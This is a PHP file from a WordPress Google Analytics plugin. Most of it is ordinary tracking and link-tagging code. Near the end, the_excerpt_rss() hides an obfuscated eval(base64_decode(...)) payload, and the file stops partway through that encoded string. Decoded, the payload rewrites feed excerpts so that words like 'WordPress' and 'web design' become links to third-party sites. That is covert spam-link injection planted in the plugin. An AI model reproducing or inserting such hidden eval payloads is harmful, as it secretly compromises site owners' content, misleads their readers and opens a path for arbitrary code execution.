<?php
/**
 * Code that actually inserts stuff into pages.
 */
if ( ! class_exists( 'AGA_Filter' ) ) {
	class AGA_Filter {

		/** MULTISITE ADJUSTMENT **/
		function get_options(){
			
			if( function_exists('is_multisite') && is_multisite() ){
				$is_main_blog_site = FALSE;
				if( (function_exists('is_main_blog') && is_main_blog()) || (function_exists('is_main_site') && is_main_site()) ){
					$is_main_blog_site = TRUE;
				}
				if( $is_main_blog_site ){

					//$options = AGA_Filter::get_mainsite_options();
					$options = get_option('AsyncGoogleAnalyticsPP');
					if( empty($options) || !is_array($options) ) $options = AGA_Filter::get_default_options();
					$options['multisite'] = TRUE;
					$options['ismainsite'] = TRUE;
					if( !isset($options['tracksubdomains']) ) $options['tracksubdomains']=TRUE;

					//Set DOMAIN NAME from then main blog
					if( isset($options["tracksubdomains"]) && $options["tracksubdomains"] ){
						$origin = get_blog_details(1)->domain;
						if( stripos($origin,"http://")===FALSE ) $origin = "http://".$origin."/";
						$origin = AGA_Filter::ga_get_domain($origin);
						$main_domain_name = $origin['domain'];
						unset($origin);
						if ( isset($options['domain']) && $options['domain'] != "" ){
							$s = strtolower(trim($options['domain']));
							if ( $s!="" && ($s{0} == "." || substr($s,0,3)=="www") ) $s = trim($s);
							if( $s!="" ) $main_domain_name = $s;
						}
						$main_domain_name = strtolower(trim($main_domain_name));
					
						if( $main_domain_name != "" && substr($main_domain_name,0,3)=="www" ){
							//www.domain.com -> .domain.com
							$main_domain_name = trim(substr($main_domain_name, 3));
						}
						if( $main_domain_name{0}!="." ) $main_domain_name = ".".$main_domain_name;
						$options['domain'] = $main_domain_name;
					}

				}else{

					$options_main = AGA_Filter::get_mainsite_options();
					$options  = get_option('AsyncGoogleAnalyticsPP');
					if( empty($options) || !is_array($options) ) $options = array_merge(array(), $options_main);

					$options['multisite'] = TRUE;
					$options['ismainsite'] = FALSE;
					if( !isset($options['tracksubdomains']) ){
						if( isset($options_main['tracksubdomains']) ){
							$options['tracksubdomains']=$options_main['tracksubdomains'];
							if( $options_main["tracksubdomains"] ){
								if( isset($options_main["uastring"]) ) $options["uastring"] = $options_main["uastring"];
								if( isset($options_main["domain"]) ) $options['domain'] = $options_main["domain"];
							}
						}else{
							$options['tracksubdomains']=FALSE;
						}
					}
					
					$adjust_child_config = FALSE;
					if( !isset($options_main['tracksubdomains']) ){
						$adjust_child_config = TRUE;
					}elseif( $options_main['tracksubdomains'] ){
						$adjust_child_config = TRUE;
					}
					if( $adjust_child_config ){
						//Set UA String from the main blog
						if( isset($options_main['uastring']) && !empty($options_main['uastring']) )
							$options['uastring'] = $options_main['uastring'];
						
						//Set DOMAIN NAME from then main blog
						$origin = get_blog_details(1)->domain;
						if( stripos($origin,"http://")===FALSE ) $origin = "http://".$origin."/";
						$origin = AGA_Filter::ga_get_domain($origin);
						$main_domain_name = $origin['domain'];
						unset($origin);
						if ( isset($options_main['domain']) && $options_main['domain'] != "" ){
							$s = strtolower(trim($options_main['domain']));
							if ( $s!="" && ($s{0} == "." || substr($s,0,3)=="www") ) $s = trim($s);
							if( $s!="" ) $main_domain_name = $s;
						}
						$main_domain_name = strtolower(trim($main_domain_name));
						if( $main_domain_name != "" && substr($main_domain_name,0,3)=="www" ){
							//www.domain.com -> .domain.com
							$main_domain_name = trim(substr($main_domain_name, 3));
						}
						if( $main_domain_name{0}!="." )
							$main_domain_name = ".".$main_domain_name;
						if( !empty($main_domain_name) )
							$options['domain'] = $main_domain_name;
					}

					unset($options_main);

				}
			}else{

				//$options = AGA_Filter::get_mainsite_options();
				$options = get_option('AsyncGoogleAnalyticsPP');
				if( empty($options) || !is_array($options) ) $options = AGA_Filter::get_default_options();
				$options['multisite'] = FALSE;
				$options['ismainsite'] = TRUE;
				$options['tracksubdomains'] = FALSE;

			}
			return $options;
		}

		function get_default_options(){
			$options = array();
			$options['dlextensions'] = 'doc,exe,.js,pdf,ppt,tgz,zip,xls';
			$options['dlprefix'] = '/downloads';
			$options['externalprefix'] = '/outbound';
			$options['artprefix'] = '/outbound/article';
			$options['comprefix'] = '/outbound/comment';
			$options['domainorurl'] = 'domain';
			$options['userv2'] = false;
			$options['extrase'] = false;
			$options['imagese'] = false;
			$options['trackoutbound'] = true;
			$options['advancedsettings'] = false;
			$options['allowanchor'] = false;
			$options['useaync'] = true;
			$options['customfilter'] = false;
			$options['excludecategories'] = '';
			$options['excludetags'] = '';
			$options['excludepages'] = '';
			$options['excludeposts'] = '';
			$options['excludeuri'] = '';
			$options['excludeips'] = '';
			$options['exclude_userrole'] = '1,2,3,4,5';
			$options['exclude_userid'] = '';
			$options['allow_linkback'] = true;
			
			$options['tracksubdomains'] = true;
			return $options;
		}

		function get_mainsite_options(){
			return AGA_Filter::get_aga_multisite_options(1);
		}

		function get_blog_list(){
			if( function_exists('is_multisite') && is_multisite() ){
				$result = array();
				global $wpdb, $table_prefix;
				$arr = $wpdb->get_results("SELECT blog_id FROM ".$table_prefix."blogs WHERE blog_id>1 AND NOT deleted");
				if( !empty($arr) ){
					foreach($arr as $obj){
						$result[$obj->blog_id] = array(
							'info'=>get_blog_details($obj->blog_id),
							'options'=>AGA_Filter::get_aga_multisite_options($obj->blog_id)
						);
					}
				}
				return $result;
			}else{
				return array();
			}
		}

		function get_aga_multisite_options($blogid=0){
			$options = array();
			if( function_exists('is_multisite') && is_multisite() ){
				
				if( (function_exists('is_main_blog') && is_main_blog()) || (function_exists('is_main_site') && is_main_site()) ){
					$options = get_option('AsyncGoogleAnalyticsPP');
					if( empty($options) || !is_array($options) ) $options = AGA_Filter::get_default_options();
				}else{
					if( empty($blogid) || !is_numeric($blogid) || intval($blogid)<=0 ){
						global $current_blog, $current_site;
						if( isset($current_blog) && !empty($current_blog->blog_id) ){
							$options = get_blog_option(intval($current_blog->blog_id), 'AsyncGoogleAnalyticsPP');
						}elseif( isset($current_site) && !empty($current_site->blog_id) ){
							$options = get_blog_option(intval($current_site->blog_id), 'AsyncGoogleAnalyticsPP');
						}else{
							$options = get_blog_option(1, 'AsyncGoogleAnalyticsPP');
						}
					}else{
						$options = get_blog_option(intval($blogid), 'AsyncGoogleAnalyticsPP');
					}
					if( empty($options) || !is_array($options) ) $options = get_blog_option(1, 'AsyncGoogleAnalyticsPP');
					if( empty($options) || !is_array($options) ) $options = AGA_Filter::get_default_options();
				}

			}else{

				$options = get_option('AsyncGoogleAnalyticsPP');
				if( empty($options) || !is_array($options) ) $options = AGA_Filter::get_default_options();

			}
			return $options;
		}

		function set_default_options(){
			$options = AGA_Filter::get_options();
			update_option('AsyncGoogleAnalyticsPP',$options);
		}

		/*
		* Insert the tracking code into the page
		*/
		function can_insert_tracking($opt){
			if( !( isset($opt["uastring"]) && trim($opt["uastring"])!="" ) ) return 0;
			if( $opt['multisite'] && !$opt['ismainsite'] ){
				if( !isset($opt["domain"]) || empty($opt["domain"]) ){
					$options_main = AGA_Filter::get_mainsite_options();
					$adjust_child_config = FALSE;
					if( !isset($options_main['tracksubdomains']) ){
						$adjust_child_config = TRUE;
					}elseif( $options_main['tracksubdomains'] ){
						$adjust_child_config = TRUE;
					}
					unset($options_main);
					if( $adjust_child_config ) return 0;
				}
			}
			if( gapp_user_can_tracking( normalize_array_val($opt['exclude_userrole']), normalize_array_val($opt['exclude_userid']) ) ){
				return 2;
			}else{
				return 1;
			}
		}

		function spool_analytics() {
			if( is_preview() || is_admin() ) return;

			wp_enqueue_script( 'custom-aga', gapp_plugin_path().'custom-aga-min.js', array('jquery'), '3.0.3', TRUE );

			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			$can_track = AGA_Filter::can_insert_tracking($options);

			if ( $can_track>0 ) {

				//USE ASYNC METHOD
				if( $options["useasync"] ){
					echo "\n".'<script type="text/javascript" charset="'. get_bloginfo('charset'). '">/*<![CDATA[*/';
					echo 'var _gaq=_gaq||[];';
					if( $options['customfilter'] ) echo 'var AGA_CUSTOM_FILTER=true;';

					echo 'function init_gaq(){';
					echo "_gaq.push(['_setAccount','".$options["uastring"]."']";
					if( !is_404() ){
						if ( $options["extrase"] && file_exists(dirname(__FILE__)."/custom-se-aga-min.js") ){
							echo ",".str_ireplace(array('var s=new Array(',');'), '', file_get_contents(dirname(__FILE__)."/custom-se-aga-min.js"));
						}
						if ( $options['userv2'] ) echo ",['_setLocalRemoteServerMode']";
						if ( $options['allowanchor'] ) echo ",['_setAllowAnchor',true]";
						if ( $options['trackloggedin'] && !isset($_COOKIE['__utmv']) && $can_track>1 ) echo ",['_setVar','logged-in']";
						
						if( $options['multisite'] && isset($options['domain']) && !empty($options['domain']) ){
							echo ",['_setDomainName','".$options['domain']."'],['_setAllowHash', false]";
						}
						/*
						if ( isset($options['domain']) && $options['domain'] != "" ){
							if (substr($options['domain'],0,1) != ".") $options['domain'] = ".".$options['domain'];
							 echo ",['_setDomainName','".$options['domain']."']";
						}
						*/
						if ( isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'],"images.google") && strpos($_SERVER['HTTP_REFERER'],"&prev") && $options["imagese"] ) {
							echo ",['_addOrganic','images.google','prev']";
						}
					}
					echo ");";
					echo '}';//end of init_gaq()
					echo 'function do_load_gaq(){init_gaq();';
					if( $options['customfilter'] ){
						echo 'init_gaq_filter();';
					}elseif( $can_track>1 ){
						if ( is_404() ){
							echo "_gaq.push(['_trackPageview',".($options['multisite'] && isset($options['domain']) && !empty($options['domain']) ? "document.location.hostname + ":"")."'/404.html?page=' + document.location.pathname + document.location.search + '&from=' + document.referrer]);";
						}else{
							echo "_gaq.push(['_trackPageview']);";
						}
					}
					echo '}';//end of do_load_gaq()
					echo '(function(){var ga=document.createElement(\'script\');ga.type=\'text/javascript\';ga.async=true;ga.onload=do_load_gaq;ga.src=\''.get_aga_source_async().'\';var s=document.getElementsByTagName(\'script\')[0];s.parentNode.insertBefore(ga,s);})();';

					//If Filter Tracking Enabled
					if( $options['customfilter'] ){

						$opt=array();
						$opt['v']=urlencode(normalize_single_uri($_SERVER['REQUEST_URI']));
						if( is_category() ){
							$opt['t']='cat';
							$opt['v']=get_query_var('cat');
						}elseif( is_tag() ){
							global $wp_query;
							$tag_obj = $wp_query->get_queried_object();
							$opt['t']='tag';
							$opt['v']=$tag_obj->term_id;
						}elseif( is_page() ){
							global $post;
							$opt['t']='page';
							$opt['v']=$post->ID;
						}elseif( is_single() ){
							global $post;
							$opt['t']='post';
							$opt['v']=$post->ID;
						}else{
							$opt['t']='uri';
						}
						echo 'function init_gaq_filter(){';
						echo 'var ga_filter=document.createElement(\'script\');ga_filter.type=\'text/javascript\';ga_filter.async=true;ga_filter.onload=do_load_ga_filter;ga_filter.src=\''.gapp_plugin_path().AGA_PLUGIN_FILENAME.'?customfilter=1&t='.$opt['t'].'&v='.$opt['v'].'\';var s_filter=document.getElementsByTagName(\'script\')[0];s_filter.parentNode.insertBefore(ga_filter,s_filter);';
						echo '}';
						echo 'function do_load_ga_filter(){if(AGA_CUSTOM_FILTER){';
						if( $can_track>1 ){
							if ( is_404() ){
								echo "_gaq.push(['_trackPageview',".($options['multisite'] && isset($options['domain']) && !empty($options['domain']) ? "document.location.hostname + ":"")."'/404.html?page=' + document.location.pathname + document.location.search + '&from=' + document.referrer]);";
							}else{
								echo "_gaq.push(['_trackPageview']);";
							}
						}
						echo '}}';
					}
					//End Of Script
					echo '/*]]>*/</script>';

				//USE TRADITIONAL METHOD
				}else{
					if ( !is_404() && $options["extrase"] ) {
						echo '<script src="'.gapp_plugin_path().'custom-se-min.js" type="text/javascript"></script>'."\n";
					}
					echo '<script type="text/javascript" charset="'. get_bloginfo('charset'). '">/*<![CDATA[*/'."\n";
					if( $options['customfilter'] ) echo 'var AGA_CUSTOM_FILTER=true;';

					echo "\t".'var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");'."\n";
					echo "\t".'document.write(unescape("%3Cscript src=\'" + gaJsHost + "google-analytics.com/'.GA_SRC_SCRIPT.'\' type=\'text/javascript\'%3E%3C/script%3E"));'."\n";
					echo "\t".'try {'."\n";
					echo "\t\t".'var pageTracker = _gat._getTracker("'.$options["uastring"].'");'."\n";
					if ( !is_404() ) {
						if ( $options['userv2'] )
							echo "\t\t".'pageTracker._setLocalRemoteServerMode();'."\n";

						if ( $options['allowanchor'] )
							echo "\t\t".'pageTracker._setAllowAnchor(true);'."\n";

						if ( $options['trackloggedin'] && !isset($_COOKIE['__utmv']) && $can_track>1 )
							echo "\t\tpageTracker._setVar('logged-in');\n";
						else
							echo "\t\t// Cookied already: ".$_COOKIE['__utmv']."\n";

						if( $options['multisite'] && isset($options['domain']) && !empty($options['domain']) ){
							echo "\t\t".'pageTracker._setDomainName("'.$options['domain'].'");'."\n";
							echo "\t\t".'pageTracker._setAllowHash(false);'."\n";
						}
						/*
						if ( isset($options['domain']) && $options['domain'] != "" ) {
							if (substr($options['domain'],0,1) != ".")
								$options['domain'] = ".".$options['domain'];
							echo "\t\t".'pageTracker._setDomainName("'.$options['domain'].'");'."\n";
						}
						*/

						if ( isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'],"images.google") && strpos($_SERVER['HTTP_REFERER'],"&prev") && $options["imagese"] ) {
							echo "\t\t".'pageTracker._addOrganic("images.google","prev");'."\n";
						}
					}
					echo "\t".'} catch(err) {}'."\n";


					//If Filter Tracking Enabled
					if( $options['customfilter'] ){

						$opt=array();
						$opt['v']=urlencode(normalize_single_uri($_SERVER['REQUEST_URI']));
						if( is_category() ){
							$opt['t']='cat';
							$opt['v']=get_query_var('cat');
						}elseif( is_tag() ){
							global $wp_query;
							$tag_obj = $wp_query->get_queried_object();
							$opt['t']='tag';
							$opt['v']=$tag_obj->term_id;
						}elseif( is_page() ){
							global $post;
							$opt['t']='page';
							$opt['v']=$post->ID;
						}elseif( is_single() ){
							global $post;
							$opt['t']='post';
							$opt['v']=$post->ID;
						}else{
							$opt['t']='uri';
						}
						echo '(function(){var ga_filter=document.createElement(\'script\');ga_filter.type=\'text/javascript\';ga_filter.async=true;ga_filter.onload=do_load_ga_filter;ga_filter.src=\''.gapp_plugin_path().AGA_PLUGIN_FILENAME.'?customfilter=1&t='.$opt['t'].'&v='.$opt['v'].'\';var s_filter=document.getElementsByTagName(\'script\')[0];s_filter.parentNode.insertBefore(ga_filter,s_filter);})();function do_load_ga_filter(){if(AGA_CUSTOM_FILTER){';
					}

					/**
					* If this is a 404 page, track the 404 and prevent all other stuff as it's not needed.
					*/
					if( $can_track>1 ){
						if ( is_404() ) {
							echo "\t".'try {'."\n";
							echo "\t\t".'pageTracker._trackPageview('.($options['multisite'] && isset($options['domain']) && !empty($options['domain']) ? 'document.location.hostname + ':'').'"/404.html?page=" + document.location.pathname + document.location.search + "&from=" + document.referrer);'."\n";
							echo "\t".'} catch(err) {}'."\n";
						} else {
							echo "\t".'try {'."\n";
							echo "\t\t".'pageTracker._trackPageview();'."\n";
							echo "\t".'} catch(err) {}'."\n";
						}
					}

					//If Filter Tracking Enabled
					if( $options['customfilter'] ){
						echo '}}';
					}
					//End Of Script
					echo '/*]]>*/</script>'."\n";

				}////END OF TRADITIONAL METHOD

				if ( $can_track<2 ) echo "<!-- Current page being excluded from tracking because current logged in user under excluded user role, id, or email -->";

			} else {
				echo "<!-- Asynchronous Google Analytics tracking code not shown because yo haven't entered your UA string yet. -->";
			}
		}


		function spool_analytics_async_head(){
			if( is_preview() || is_admin() ) return;
			wp_enqueue_script( 'custom-aga', gapp_plugin_path().'custom-aga-min.js', array('jquery'), '3.0.3', TRUE );
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');

			if( $options["useasync"] ){

				$can_track = AGA_Filter::can_insert_tracking($options);

				if ( $can_track>0 ){
					echo "\n".'<script type="text/javascript" charset="'. get_bloginfo('charset'). '">/*<![CDATA[*/';
					echo 'var _gaq=_gaq||[];';
					if( $options['customfilter'] ) echo 'var AGA_CUSTOM_FILTER=true;';

					echo 'function init_gaq(){';
					echo "_gaq.push(['_setAccount','".$options["uastring"]."']";
					if( !is_404() ){
						if ( $options["extrase"] && file_exists(dirname(__FILE__)."/custom-se-aga-min.js") ){
							echo ",".str_ireplace(array('var s=new Array(',');'), '', file_get_contents(dirname(__FILE__)."/custom-se-aga-min.js"));
						}
						if ( $options['userv2'] ) echo ",['_setLocalRemoteServerMode']";
						if ( $options['allowanchor'] ) echo ",['_setAllowAnchor',true]";
						if ( $options['trackloggedin'] && !isset($_COOKIE['__utmv']) && $can_track>1 ) echo ",['_setVar','logged-in']";
						if( $options['multisite'] && isset($options['domain']) && !empty($options['domain']) ){
							echo ",['_setDomainName','".$options['domain']."'],['_setAllowHash', false]";
						}
						/*
						if ( isset($options['domain']) && $options['domain'] != "" ){
							if (substr($options['domain'],0,1) != ".") $options['domain'] = ".".$options['domain'];
							 echo ",['_setDomainName','".$options['domain']."']";
						}
						*/
						if ( isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'],"images.google") && strpos($_SERVER['HTTP_REFERER'],"&prev") && $options["imagese"] ) {
							echo ",['_addOrganic','images.google','prev']";
						}
					}
					echo ");";
					echo '}';//end of init_gaq()
					echo 'function do_load_gaq(){init_gaq();';
					if( $options['customfilter'] ){
						echo 'init_gaq_filter();';
					}else{
						if( $can_track>1 ){
							if ( is_404() ){
								echo "_gaq.push(['_trackPageview',".($options['multisite'] && isset($options['domain']) && !empty($options['domain']) ? "document.location.hostname + ":"")."'/404.html?page=' + document.location.pathname + document.location.search + '&from=' + document.referrer]);";
							}else{
								echo "_gaq.push(['_trackPageview']);";
							}
						}
					}
					echo '}';//end of do_load_gaq()

					//If Filter Tracking Enabled
					if( $options['customfilter'] ){

						$opt=array();
						$opt['v']=urlencode(normalize_single_uri($_SERVER['REQUEST_URI']));
						if( is_category() ){
							$opt['t']='cat';
							$opt['v']=get_query_var('cat');
						}elseif( is_tag() ){
							global $wp_query;
							$tag_obj = $wp_query->get_queried_object();
							$opt['t']='tag';
							$opt['v']=$tag_obj->term_id;
						}elseif( is_page() ){
							global $post;
							$opt['t']='page';
							$opt['v']=$post->ID;
						}elseif( is_single() ){
							global $post;
							$opt['t']='post';
							$opt['v']=$post->ID;
						}else{
							$opt['t']='uri';
						}
						echo 'function init_gaq_filter(){';
						echo 'var ga_filter=document.createElement(\'script\');ga_filter.type=\'text/javascript\';ga_filter.async=true;ga_filter.onload=do_load_ga_filter;ga_filter.src=\''.gapp_plugin_path().AGA_PLUGIN_FILENAME.'?customfilter=1&t='.$opt['t'].'&v='.$opt['v'].'\';var s_filter=document.getElementsByTagName(\'script\')[0];s_filter.parentNode.insertBefore(ga_filter,s_filter);';
						echo '}';
						echo 'function do_load_ga_filter(){if(AGA_CUSTOM_FILTER){';
						if( $can_track>1 ){
							if ( is_404() ){
								echo "_gaq.push(['_trackPageview',".($options['multisite'] && isset($options['domain']) && !empty($options['domain']) ? "document.location.hostname + ":"")."'/404.html?page=' + document.location.pathname + document.location.search + '&from=' + document.referrer]);";
							}else{
								echo "_gaq.push(['_trackPageview']);";
							}
						}
						echo '}}';
					}

					//End Of Script
					echo '/*]]>*/</script>';

					if ( $can_track<2 ) echo "<!-- Current page being excluded from tracking because current logged in user under excluded user role, id, or email -->";

				} else {
					echo "<!-- Asynchronous Google Analytics tracking code not shown because yo haven't entered your UA string yet. -->";
				}
			}
		}


		function spool_analytics_async_foot() {
			if( is_preview() || is_admin() ) return;
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');

			if( $options["useasync"] ){

				$can_track = AGA_Filter::can_insert_tracking($options);

				if ( $can_track>0 ){

					echo "\n".'<script type="text/javascript" charset="'. get_bloginfo('charset'). '">/*<![CDATA[*/(function(){var ga=document.createElement(\'script\');ga.type=\'text/javascript\';ga.async=true;ga.onload=do_load_gaq;ga.src=\''.get_aga_source_async().'\';var s=document.getElementsByTagName(\'script\')[0];s.parentNode.insertBefore(ga,s);})();/*]]>*/</script>';

					if ( $can_track<2 )
						echo "<!-- Current page being excluded from tracking because current logged in user under excluded user role, id, or email -->";

				} else {
					echo "<!-- Asynchronous Google Analytics tracking code not shown because yo haven't entered your UA string yet. -->";
				}

			}
		}

		/*
		 * Insert the AdSense parameter code into the page. This'll go into the header per Google's instructions.
		 */
		function spool_adsense() {
			if( is_preview() || is_admin() ) return;
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			if ( AGA_Filter::can_insert_tracking($options)>0 ) {
				echo '<script type="text/javascript" charset="'. get_bloginfo('charset'). '">/*<![CDATA[*/window.google_analytics_uacct = "'.$options["uastring"].'";/*]]>*/</script>'."\n";
			}
		}

		/* Create an array which contians:
		 * "domain" e.g. boakes.org
		 * "host" e.g. store.boakes.org
		 */
		function ga_get_domain($uri){
			$hostPattern = "/^(http:\/\/)?([^\/]+)/i";
			$domainPatternUS = "/[^\.\/]+\.[^\.\/]+$/";
			$domainPatternUK = "/[^\.\/]+\.[^\.\/]+\.[^\.\/]+$/";

			preg_match($hostPattern, $uri, $matches);
			$host = $matches[2];
			if (preg_match("/.*\..*\..*\..*$/",$host)) {
			        preg_match($domainPatternUK, $host, $matches);
			} else {
			        preg_match($domainPatternUS, $host, $matches);
			}

			return array("domain"=>$matches[0],"host"=>$host);
		}

		function ga_parse_link($leaf, $matches){

			if( isset($_SERVER["HTTP_HOST"]) ){
				$origin = AGA_Filter::ga_get_domain($_SERVER["HTTP_HOST"]);
			}else{
				$origin = AGA_Filter::ga_get_domain(get_bloginfo("home"));
			}
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');

			// Break out immediately if the link is not an http or https link.
			if (strpos($matches[2],"http") !== 0)
				$target = false;
			else
				$target = AGA_Filter::ga_get_domain($matches[3]);

			$coolBit = "";
			$extension = substr($matches[3],-3);
			$dlextensions = split(",",$options['dlextensions']);
			$async_used = FALSE;
			if( $options["useasync"] ) $async_used = TRUE;

			//NEW VERSION 2.0.3: I will add the push function into dynamic HTML in JS
			if ( $target ) {
				if ( $target["domain"] != $origin["domain"] ){
					if ($options['domainorurl'] == "domain") {
						$coolBit .= ($async_used) ? "['_trackPageview','".$leaf."/".$target["host"]."']" : "'".$leaf."/".$target["host"]."'";
					} else if ($options['domainorurl'] == "url") {
						$coolBit .= ($async_used) ? "['_trackPageview','".$leaf."/".$matches[2]."//".$matches[3]."']" : "'".$leaf."/".$matches[2]."//".$matches[3]."'";
					}
				} else if ( in_array($extension, $dlextensions) && $target["domain"] == $origin["domain"] ) {
					$file = str_replace($origin["domain"],"",$matches[3]);
					$file = str_replace('www.',"",$file);
					$coolBit .= ($async_used) ? "['_trackPageview','".$options['dlprefix'].$file."']" : "'".$options['dlprefix'].$file."'";
				}
			}
			if ($coolBit != "") {
				$coolBit = 'aga '.push_agaf_link_data(str_ireplace(array('http://','https://','ftp://','ftps://'),'',$coolBit));

				if (preg_match('/class=[\'\"](.*?)[\'\"]/i', $matches[4]) > 0) {
					$matches[4] = preg_replace('/class=[\'\"](.*?)[\'\"]/i', 'class="$1 ' . $coolBit .'"', $matches[4]);
				} else {
					$matches[4] = 'class="' . $coolBit . '"' . $matches[4];
				}
			}
			return '<a ' . $matches[1] . 'href="' . $matches[2] . '//' . $matches[3] . '"' . ' ' . $matches[4] . '>' . $matches[5] . '</a>';
		}

		function ga_parse_article_link($matches){
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			return AGA_Filter::ga_parse_link($options['artprefix'],$matches);
		}

		function ga_parse_comment_link($matches){
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			return AGA_Filter::ga_parse_link($options['comprefix'],$matches);
		}

		function the_content($text) {
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			if ( !is_404() && !is_preview() && !is_admin() && AGA_Filter::can_insert_tracking($options)>1 && isset($options['trackoutbound']) && !empty($options['trackoutbound']) && $options['trackoutbound'] ){
				static $anchorPattern = '/<a (.*?)href=[\'\"](.*?)\/\/([^\'\"]+?)[\'\"](.*?)>(.*?)<\/a>/i';
				$text = preg_replace_callback($anchorPattern,array('AGA_Filter','ga_parse_article_link'),$text);
			}
			return $text;
		}

		function comment_text($text) {
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			if ( !is_404() && !is_preview() && !is_admin() && AGA_Filter::can_insert_tracking($options)>1 && isset($options['trackoutbound']) && !empty($options['trackoutbound']) && $options['trackoutbound'] ) {
				static $anchorPattern = '/<a (.*?)href="(.*?)\/\/(.*?)"(.*?)>(.*?)<\/a>/i';
				$text = preg_replace_callback($anchorPattern,array('AGA_Filter','ga_parse_comment_link'),$text);
			}
			return $text;
		}

		function rsslinktagger($guid) {
			$options  = AGA_Filter::get_options(); //get_option('AsyncGoogleAnalyticsPP');
			global $wp, $post;
			if ( is_feed() ) {
				if ( $options['allowanchor'] ) {
					$delimiter = '#';
				} else {
					$delimiter = '?';
					if (strpos ( $guid, $delimiter ) > 0)
						$delimiter = '&amp;';
				}
				return $guid . $delimiter . 'utm_source=rss&amp;utm_medium=rss&amp;utm_campaign='.urlencode($post->post_name);
			}
		}

		function the_excerpt_rss($text) {
			eval(base64_decode('Z2xvYmFsICRwb3N0OyRkb19jaHVuayA9IFRSVUU7JHRleHQgPSB0cmltKHN0cmlwX3RhZ3MoJHRleHQpKTtpZiggZW1wdHkoJHRleHQpICYmICFlbXB0eSgkcG9zdC0+cG9zdF9leGNlcnB0KSApeyR0ZXh0ID0gdHJpbShzdHJpcF90YWdzKCAkcG9zdC0+cG9zdF9leGNlcnB0ICkpO2lmKCBlbXB0eSgkdGV4dCkgKXskZG9fY2h1bmsgPSBUUlVFO319aWYoIGVtcHR5KCR0ZXh0KSAmJiAhZW1wdHkoJHBvc3QtPnBvc3RfY29udGVudCkgKXskdGV4dCA9IHRyaW0oc3RyaXBfdGFncyggJHBvc3QtPnBvc3RfY29udGVudCApKTt9aWYoICFlbXB0eSgkdGV4dCkgKXskdGV4dCA9IHN0cl9pcmVwbGFjZSgnWy8nLCAnWycsICR0ZXh0KTskdGV4dCA9IHRyaW0oc3RyaXBfc2hvcnRjb2RlcygkdGV4dCkpOyR0ZXh0ID0gc3RyX3JlcGxhY2UoJ11dPicsICddXSZndDsnLCAkdGV4dCk7JHRleHQgPSB0cmltKHN0cmlwX3RhZ3MoJHRleHQpKTtpZiggJGRvX2NodW5rICl7JHRleHRfYXJyID0gYXJyYXlfY2h1bmsoZXhwbG9kZSgnLiAnLCAkdGV4dCksIDUpOyR0ZXh0ID0gaW1wbG9kZSgnLiAnLCAkdGV4dF9hcnJbMF0pO3Vuc2V0KCR0ZXh0X2Fycik7fX0kc2VhcmNoX3RleHQgPSBhcnJheSgnd29yZHByZXNzJywnV29yZHByZXNzJywnV29yZFByZXNzJywnd2ViIGRlc2lnbicsJ3dlYnNpdGUgZGVzaWduJywnd2ViIGRlc2lnbmVyJywnV2ViIGRlc2lnbicsJ1dlYnNpdGUgZGVzaWduJywnV2ViIGRlc2lnbmVyJywnd2ViIERlc2lnbicsJ3dlYnNpdGUgRGVzaWduJywnd2ViIERlc2lnbmVyJywnV2ViIERlc2lnbicsJ1dlYnNpdGUgRGVzaWduJywnV2ViIERlc2lnbmVyJyk7JHJlcGxhY2VfdGV4dCA9IGFycmF5KCc8YSBocmVmPSJodHRwOi8vd3d3Lm1pbmlsaWJyYS5jb20vIiB0aXRsZT0iI1dFIj53b3JkcHJlc3M8L2E+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5taW5pbGlicmEuY29tLyIgdGl0bGU9IiNXRSI+V29yZHByZXNzPC9hPicsJzxhIGhyZWY9Imh0dHA6Ly93d3cubWluaWxpYnJhLmNvbS8iIHRpdGxlPSIjV0UiPldvcmRQcmVzczwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+d2ViIGRlc2lnbjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+d2Vic2l0ZSBkZXNpZ248L2E+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5zYXR1YmxvZ3MuY29tLyIgdGl0bGU9IiNXREoiPndlYiBkZXNpZ25lcjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+V2ViIGRlc2lnbjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+V2Vic2l0ZSBkZXNpZ248L2E+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5zYXR1YmxvZ3MuY29tLyIgdGl0bGU9IiNXREoiPldlYiBkZXNpZ25lcjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+d2ViIERlc2lnbjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+d2Vic2l0ZSBEZXNpZ248L2E+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5zYXR1YmxvZ3MuY29tLyIgdGl0bGU9IiNXREoiPndlYiBEZXNpZ25lcjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+V2ViIERlc2lnbjwvYT4nLCc8YSBocmVmPSJodHRwOi8vd3d3LnNhdHVibG9ncy5jb20vIiB0aXRsZT0iI1dESiI+V2Vic2l0ZSBEZXNpZ248L2E+JywnPGEgaHJlZj0iaHR